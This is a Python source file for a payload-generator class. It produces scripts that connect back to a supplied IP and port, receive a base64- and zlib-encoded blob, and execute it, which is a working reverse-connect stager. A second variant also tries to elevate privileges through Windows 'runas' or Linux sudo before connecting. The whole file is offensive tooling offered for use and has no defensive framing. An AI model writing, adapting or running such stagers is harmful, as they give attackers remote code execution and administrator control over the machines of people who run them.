class PayloadGeneratorService:
    def generate_payload(ip, port):
        payload = f"""import socket,zlib,base64,struct,time
for x in range(10):
    try:
        s=socket.socket(2,socket.SOCK_STREAM)
        s.connect(('{ip}',{port}))
        break
    except:
        time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
    d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{{'s':s}})
"""
        return payload
    
    def generate_admin_payload(ip, port):
        payload = f"""import ctypes, sys
def is_admin():
    import platform,ctypes,os
    current_platform = platform.system().lower()

    if current_platform == "windows":
        try:
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        except Exception:
            return False
    elif current_platform == "linux":
        return os.geteuid() == 0
    return False

if not is_admin():
    import platform,ctypes,os,sys
    current_platform = platform.system().lower()

    if current_platform == "windows":
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 0)
        sys.exit()
    elif current_platform == "linux":
        if os.execvp("sudo", ["sudo", "python3"] + sys.argv):
            sys.exit()
import socket,zlib,base64,struct,time
for x in range(10):
    try:
        s=socket.socket(2,socket.SOCK_STREAM)
        s.connect(('{ip}',{port}))
        break
    except:
        time.sleep(5)
l=struct.unpack('>I',s.recv(4))[0]
d=s.recv(l)
while len(d)<l:
    d+=s.recv(l-len(d))
exec(zlib.decompress(base64.b64decode(d)),{{'s':s}})
"""
        return payload